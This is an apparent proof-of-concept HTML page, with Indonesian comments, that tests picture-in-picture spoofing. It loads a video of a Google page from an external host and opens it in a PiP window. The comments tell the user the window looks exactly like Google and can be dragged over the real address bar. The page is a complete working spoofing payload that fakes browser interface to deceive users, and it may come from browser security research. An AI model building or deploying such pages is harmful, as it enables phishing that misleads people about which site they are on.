<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>PiP PoC</title>
</head>
<body style="font-family: sans-serif; padding: 40px; background: #ffffff;">
  <h1>PiP Spoofing Test</h1>

  <!-- Video MP4 landscape 16:9, bisa nutupin address bar kayak video bunga -->
  <video id="v" controls autoplay muted playsinline loop style="width: 100%;" src="https://0x403for.github.io/google-spoof-v2.mp4"></video>
  <br><br>
  <button onclick="pip()" style="font-size: 20px; padding: 15px 30px;">Buka PiP</button>
  <p id="o"></p>

  <script>
    async function pip(){
      try{
        var v = document.getElementById('v');
        await v.requestPictureInPicture();
        document.getElementById('o').innerText = 'PiP opened. Isinya Google persis. Coba geser PiP-nya sampe nutupin address bar asli.';
      }catch(e){
        document.getElementById('o').innerText = 'Blocked: ' + e;
      }
    }
  </script>
</body>
</html>
